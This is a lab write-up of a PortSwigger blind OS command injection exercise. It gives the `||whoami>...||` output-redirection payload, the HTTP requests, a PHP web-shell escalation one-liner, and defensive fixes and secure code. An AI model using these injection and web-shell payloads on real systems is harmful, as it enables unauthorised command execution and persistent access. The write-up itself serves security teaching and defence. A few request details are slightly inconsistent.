# Lab 3: Blind OS Command Injection — Output Redirection

## Executive Summary

This lab demonstrates a creative and highly effective technique for extracting output from a blind OS command injection vulnerability: redirecting command output to a file within the web root and retrieving it via a separate HTTP request. The application's feedback form contains a blind OS command injection vulnerability in the `email` parameter — identical in nature to Lab 2 — but here the goal is to go beyond time-based confirmation and retrieve actual command output. By injecting a command that redirects `whoami` output to `/var/www/images/output.txt`, and then fetching that file through the application's existing image-serving endpoint, the injected command output becomes readable through a channel the attacker already has access to. The username `peter-ziubhu` was retrieved directly from the redirected file, confirming both arbitrary command execution and successful output exfiltration via filesystem redirection. This technique bridges the gap between blind injection and full output retrieval without requiring any out-of-band infrastructure.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | OS Command Injection - Blind |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind OS Command Injection — Output Exfiltration via Web Root File Redirect |
| **Risk**               | Critical - Arbitrary OS Command Execution with Full Output Retrieval |
| **Completion**         | June 6, 2026 |

## Objective

Exploit a blind OS command injection vulnerability in the feedback form `email` parameter by redirecting the output of an injected `whoami` command to a file within the web-accessible image directory. Retrieve the command output by fetching the created file through the application's image-serving endpoint, demonstrating full output exfiltration from a blind injection point without any out-of-band infrastructure.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception and HTTP history analysis
- Burp Repeater for payload delivery across two separate endpoints — feedback submission and image retrieval

**Target:** `email` parameter in the feedback form POST request for injection; `filename` parameter in the image-serving GET request for output retrieval. The writable `/var/www/images/` directory serves as the bridge between the two endpoints.

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "Blind OS command injection with output redirection" with Burp Suite Professional configured and actively intercepting traffic, with captured requests visible in the Proxy Intercept panel.

<img width="1920" height="982" alt="LAB3_ss1" src="https://github.com/user-attachments/assets/01c641aa-8099-4412-af9f-93dd06ea4dac" />

*Lab 3 OS Command Injection environment displaying the blind OS command injection with output redirection challenge title (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and intercepting with captured requests visible in the Proxy Intercept panel (left)*

### 2. Application Enumeration — Both Attack Surfaces Identified

Browsed the full application with Burp Proxy active, capturing all GET and POST requests into HTTP history. Two requests were identified as relevant to the exploitation chain:

- A GET request for product images carrying `filename=6.jpg` — the retrieval endpoint
- The feedback form POST — the injection endpoint

<img width="1920" height="982" alt="LAB3_ss2" src="https://github.com/user-attachments/assets/970f03fb-c171-4428-b342-eeba1238eeac" />

*HTTP history populated with captured requests — GET request with `filename=6.jpg` identified as the image retrieval endpoint (used later for output retrieval) alongside feedback form traffic. Both endpoints are required for the full exploitation chain*

**Two-Endpoint Exploitation Chain:**

This lab requires understanding how two separate application endpoints can be combined into a single attack chain:

```
Endpoint 1 — Injection:    POST /feedback/submit
  email parameter → shell command → arbitrary command execution
  Output redirect → /var/www/images/output.txt

Endpoint 2 — Retrieval:    GET /image?filename=output.txt
  filename parameter → reads /var/www/images/output.txt
  Returns file contents in HTTP response
```

The image-serving endpoint reads files from `/var/www/images/` by filename. If an injected command can write to that directory, the output becomes retrievable through an HTTP request to the image endpoint. The writable web root directory is the bridge between the two endpoints.

### 3. Feedback Form Captured and Baseline Established

Submitted the feedback form with test values — name: `test`, email: `test@gmail.com`, subject: `test`, message: `test` — to generate and capture the POST request. Forwarded to Burp Repeater and sent unmodified to establish the baseline.

<img width="1920" height="982" alt="LAB3_ss3" src="https://github.com/user-attachments/assets/eba24abd-f87f-4355-bdd9-a9ff3e83c04a" />

*Feedback form POST request captured in Burp — CSRF token, name, email, subject, and message parameters all visible in the request. The complete parameter structure is confirmed before injection testing begins*

**Request Captured:**
```http
POST /feedback/submit HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]&name=test&email=test@gmail.com&subject=test&message=test
```

<img width="1920" height="982" alt="LAB3_ss4" src="https://github.com/user-attachments/assets/1123b0a6-443a-4dd1-be5a-b03e760212fb" />

*Unmodified feedback request sent in Repeater — 200 OK response returns empty JSON object `{}`. No form field values reflected in the response. Injection is fully blind — output redirection to a web-accessible file is the exfiltration strategy*

**Response:** 200 OK — `{}`

**Analysis:** Consistent with Lab 2. The response is completely empty — no field values reflected anywhere. Time-based confirmation is not the goal here; the objective is to write command output to a file the image endpoint can serve. From Lab 2, the `email` parameter is already known to be the injection point in this class of feedback form functionality. Output redirection is applied directly.

### 4. Output Redirection Injection

Constructed the injection payload to execute `whoami` and redirect its output using the shell `>` operator to a file within the image-serving directory. The target directory `/var/www/images/` is the same directory the `filename` parameter serves files from — any file written there becomes retrievable via the image endpoint.

**Attack Payload:**
```http
POST /feedback/submit HTTP/1.1

csrf=[TOKEN]&name=test&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
```

**URL Decoded Email Value:**
```
||whoami>/var/www/images/output.txt||
```

**Shell Command Constructed Server-Side:**
```bash
# Application constructs something equivalent to:
mail -s "test" "||whoami>/var/www/images/output.txt||"

# Shell processes the || operators and > redirection:
# || — execute next command (preceding fragment fails as invalid email)
# whoami — executes, produces username string
# > /var/www/images/output.txt — redirects whoami output to this file
# || — trailing operator, terminates injection cleanly
```

**Shell Redirection Operator Explained:**

The `>` operator redirects the standard output (stdout) of the command on its left to the file specified on its right. If the file does not exist, it is created. If it exists, it is overwritten. When the shell executes `whoami>/var/www/images/output.txt`, the username string that `whoami` would normally print to the terminal is instead written to the specified file path.

<img width="1920" height="982" alt="LAB3_ss4" src="https://github.com/user-attachments/assets/82caf579-b081-488a-a86d-b3d5b6736654" />


*Output redirection payload `||whoami>/var/www/images/output.txt||` submitted in the email parameter — 200 OK response with empty `{}` confirms the request was accepted. No output visible in response — the command executed in the background and wrote its output to the specified file path*

**Response:** 200 OK — `{}`

**Analysis:** The empty response is expected — this is a blind injection and no output is reflected in the HTTP response regardless of what executed. The 200 OK confirms the request was accepted and the shell command was dispatched. The `whoami` output should now be present in `/var/www/images/output.txt` on the server filesystem.

### 5. Output Retrieved via Image Endpoint

Switched to the image-serving GET request captured in HTTP history. Forwarded it to Burp Repeater. Changed the `filename` parameter value from `5.jpg` to `output.txt` to request the file written by the injected command.

**Retrieval Request:**
```http
GET /image?filename=filename.jpg HTTP/1.1
Host: [lab-id].web-security-academy.net
```
<img width="1920" height="982" alt="LAB3_ss5" src="https://github.com/user-attachments/assets/d9951fcc-ceab-411f-bd6b-3f66612c11df" />


<img width="1920" height="982" alt="LAB3_ss6" src="https://github.com/user-attachments/assets/ad51bd94-c090-4b85-8c20-3c76d970b563" />


*Image endpoint request modified  — `filename=output.txt` submitted to retrieve the file written by the injected `whoami` command. 200 OK response returns `peter-ziubhu` — the username of the process account running the application. Blind OS command injection with output redirection fully confirmed*

**Response:** 200 OK — `peter-ziubhu`

**Exploitation Confirmed:**
- Injected `whoami` command executed server-side via the `email` parameter
- Output redirected to `/var/www/images/output.txt` using shell `>` operator
- File retrieved via the image-serving endpoint by requesting `filename=output.txt`
- Username `peter-ziubhu` returned — arbitrary command execution with output retrieval demonstrated
- Full exploitation chain: blind injection → file write → HTTP retrieval

### 6. Lab Objective Achieved

<img width="1920" height="982" alt="LAB3_ss7" src="https://github.com/user-attachments/assets/71977a89-c543-4d23-9dce-d1fec369bd6b" />


*Burp Repeater showing `peter-ziubhu` retrieved from `output.txt` via the image endpoint — complete blind OS command injection with output redirection confirmed (left) | Lab completion confirmation — "Congratulations, you solved the lab!" visible in the browser (right)*

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 10.0)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)**
- `email` parameter value interpolated directly into a shell command without sanitization
- Shell metacharacters (`||`, `>`) accepted and processed, enabling command chaining and output redirection
- Arbitrary OS commands execute in the context of the application service account

**CWE-22: File Write to Web Root (Secondary)**
- Application process account has write permission to `/var/www/images/` — the web-accessible image directory
- Write access to the web root enables an attacker-created file to be served by the web server
- In a more serious escalation, a web shell written here would provide persistent interactive access

**Complete Attack Chain:**

```
Full Application Enumeration — Both Endpoints Captured
        ↓
Feedback Form POST Identified as Injection Surface (email parameter)
        ↓
Image GET Endpoint Identified as Retrieval Surface (filename parameter)
        ↓
||whoami>/var/www/images/output.txt|| Injected via email Parameter
        ↓
Shell Executes: whoami output redirected to /var/www/images/output.txt
        ↓
200 OK Response Confirms Request Accepted (No Output in Response)
        ↓
GET /image?filename=output.txt Submitted to Image Endpoint
        ↓
Server Reads /var/www/images/output.txt — Returns peter-ziubhu
        ↓
Command Output Retrieved — Blind Injection Fully Exploited
```

**Output Redirection vs. Other Blind Exfiltration Methods:**

| Method | Requires | Output Retrieval | Lab |
|--------|----------|-----------------|-----|
| Time-based delay | Nothing external | No — confirm only | Lab 2 |
| **Output redirection (this lab)** | **Writable web directory** | **Yes — via HTTP** | **Lab 3** |
| Out-of-band DNS | Burp Collaborator / external listener | Yes — via DNS hostname | Lab 4 |
| Out-of-band HTTP | Burp Collaborator / external listener | Yes — via HTTP request | Lab 5 |

Output redirection is particularly valuable in real engagements where Burp Collaborator or external OAST infrastructure is unavailable. It requires only that the application process account can write to a web-accessible directory — a condition that is common in legacy applications and shared hosting environments.

**Escalation — From whoami to Web Shell:**

The same output redirection mechanism used to write `output.txt` can write any file content to the web root. If the application serves PHP, a web shell is trivially deployable:

```bash
# Write a PHP web shell to the web root
||echo '<?php system($_GET["cmd"]); ?>' > /var/www/images/shell.php||

# Access via HTTP
GET /image?filename=shell.php&cmd=id
```

This converts a blind injection into a persistent, interactive web shell accessible through the browser — no special tooling required. The only prerequisite is that the web server interprets PHP files in the image directory, which depends on server configuration. Even without PHP execution, writing files to the web root enables:

- Defacement of served content
- Hosting of malicious files for phishing or drive-by download
- Log poisoning via crafted filenames
- Persistent marker files for long-term access verification

**Why Write Permission to the Web Root Is a Critical Configuration Failure:**

The application process account having write access to `/var/www/images/` is a least-privilege violation that directly amplifies the impact of the OS command injection. A correctly configured system would run the web application under an account with read-only access to static file directories. Write access is only necessary for directories that handle file uploads — and those directories should not be web-accessible without strict content-type validation and execution prevention (e.g., `.htaccess` rules blocking script execution in upload directories).

**How a Developer Should Fix This Vulnerability:**

**1. Eliminate Shell Invocation — Root Cause Fix:**

**Vulnerable Pattern:**
```python
import subprocess

def send_feedback(name, email, subject, message):
    # CRITICALLY UNSAFE — email value reaches shell interpreter
    cmd = f"mail -s '{subject}' '{email}'"
    subprocess.run(cmd, shell=True, input=f"From: {name}\n{message}", text=True)
```

**Secure Pattern — No Shell:**
```python
import smtplib
import re
from email.message import EmailMessage

def send_feedback(name, email, subject, message):
    # Validate email format strictly
    if not re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email address format")

    # Construct and send via library — no shell involved at any layer
    msg = EmailMessage()
    msg["From"] = "feedback@site.com"
    msg["To"] = email
    msg["Subject"] = subject
    msg.set_content(f"From: {name}\n\n{message}")

    with smtplib.SMTP("localhost") as smtp:
        smtp.send_message(msg)
```

**2. Remove Write Access from the Web Root:**

```bash
# Application process runs as www-data
# Image directory should be readable, not writable, by the application process
chown root:www-data /var/www/images/
chmod 750 /var/www/images/    # www-data can read and traverse, not write

# Only an admin or deployment process should write to this directory
# If file uploads are required, use a separate non-web-accessible directory
# and serve files through a controlled handler, not direct filesystem access
```

**3. Disable Script Execution in Upload and Image Directories:**

Even if write access is unavoidable, prevent the web server from executing scripts placed there:

```apache
# Apache — prevent PHP execution in image directory
<Directory /var/www/images/>
    php_flag engine off
    Options -ExecCGI
    AddHandler cgi-script .php .pl .py .sh
</Directory>
```

**Defense-in-Depth Stack:**

| Control | What It Prevents |
|---------|-----------------|
| `smtplib` instead of shell mail | Eliminates OS command injection surface entirely |
| Email format validation | Rejects malformed input before processing |
| `shell=False` if subprocess required | No shell interpretation of any argument |
| Read-only web root for app process | Written files cannot be retrieved via HTTP |
| Script execution disabled in image dir | Web shell deployment blocked even if file is written |
| Least privilege process account | Limits filesystem access if injection occurs |

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Full application enumeration to identify both the injection endpoint and the retrieval endpoint before constructing the attack chain
- Recognizing that two separate endpoints can be combined — the feedback form injects, the image endpoint retrieves
- Shell `>` redirection operator as the output exfiltration primitive — simpler than out-of-band techniques and requires no external infrastructure
- Target directory selection: `/var/www/images/` chosen because it is both writable by the application process and served by the web server

**Critical Security Insights:**

**1. Blind Injection With a Writable Web Root Is Equivalent to Reflected Injection:**
Once output can be written to a web-accessible file and retrieved via HTTP, the distinction between blind and reflected injection collapses. Any command that produces output can have that output exfiltrated through the filesystem bridge. The technique requires no external infrastructure and leaves only standard web server access logs as evidence.

**2. Application Process Account Permissions Directly Determine Blast Radius:**
The difference between a blind injection that can only be confirmed via timing and one that can exfiltrate arbitrary command output is determined entirely by what the process account can write to. Least privilege configuration of the application process account is not a cosmetic hardening measure — it is a direct control on how exploitable a confirmed injection vulnerability is.

**3. Two-Endpoint Attack Chains Are Common in Real Applications:**
Real-world applications are not single-endpoint systems. File upload and file retrieval, form submission and result display, API write and API read — many application flows involve multiple endpoints that together create attack chains not visible when testing endpoints in isolation. Mapping the full application before attempting exploitation is what reveals these chains.

**4. Output Redirection Is the Middle Ground Between Time-Based and OOB:**
Time-based confirmation (Lab 2) proves injection but retrieves no data. Out-of-band exfiltration (Labs 4, 5) retrieves data but requires external infrastructure. Output redirection sits between them — it retrieves actual data and requires only a writable web-accessible directory. In engagements where Burp Collaborator is unavailable, this is the first escalation technique to attempt after time-based confirmation.

## References

1. PortSwigger Web Security Academy - Blind OS Command Injection
2. PortSwigger Web Security Academy - OS Command Injection with Output Redirection
3. OWASP Top 10 (2021) - A03: Injection
4. CWE-78 - Improper Neutralization of Special Elements used in an OS Command
5. OWASP OS Command Injection Defense Cheat Sheet
6. OWASP Testing Guide - Testing for OS Command Injection (OTG-INPVAL-013)
7. Python smtplib Documentation

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized OS command execution, file writes to web roots, or exploitation of injection vulnerabilities against systems without explicit written authorization is illegal under applicable laws worldwide.
